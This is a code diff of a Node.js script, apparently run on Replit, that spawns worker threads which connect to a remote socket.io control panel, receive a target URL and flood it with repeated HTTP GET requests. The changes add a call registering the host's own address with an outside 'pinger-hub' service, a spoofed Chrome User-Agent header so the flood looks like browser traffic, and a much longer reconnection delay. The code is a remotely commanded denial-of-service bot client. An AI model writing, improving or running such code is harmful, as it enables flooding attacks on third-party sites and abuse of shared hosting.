@@ -5,18 +5,23 @@ if (isMainThread) {
     for (i = 0; i < require('os').cpus().length / 1.5; i++) {
         new Worker(__filename);
     }
+        const axios = require('axios');
+
     const express = require('express')
 const app = express()
 app.get("/",(req,res)=>{
   res.end('e')
 })
-app.listen(80)
+app.listen(80,()=>{
+  axios.get('https://pinger-hub.1nchpp.repl.co/ping?url=https://' + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co")
+})
 } else {
+  console.log('starting thread')
     const axios = require('axios');
     var url = ''
     var stop = false
 const socket = io("wss://repfucker-panel.zsdyuqczexhehe0.repl.co", {
-  reconnectionDelayMax: 10000,
+  reconnectionDelayMax: 10000000,
 });
 socket.on("connect", () => {
   console.log(socket.id); // "G5p5..."
@@ -53,7 +58,10 @@ socket.on('stop',()=>{
         axios
             .request({
                 url,
-                method: 'GET'
+                method: 'GET',
+                                headers: {
+                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+                }
             })
             .then(r => {
                 console.log('sent ' + e + ' requests to', url);
